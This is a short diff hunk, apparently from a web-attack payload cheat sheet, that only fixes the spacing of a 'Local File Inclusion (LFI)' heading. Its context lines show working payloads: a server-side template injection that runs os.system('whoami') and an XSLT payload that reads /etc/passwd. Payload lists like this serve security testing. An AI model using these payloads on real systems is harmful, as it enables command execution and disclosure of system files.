@@ -121,7 +121,7 @@ ${{<%[%'"}}%\
 {% import os %}{{os.system('whoami')}}
 ```
 
-###Local File Inclusion (LFI)
+### Local File Inclusion (LFI)
 ```
 <xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')" />
 ```
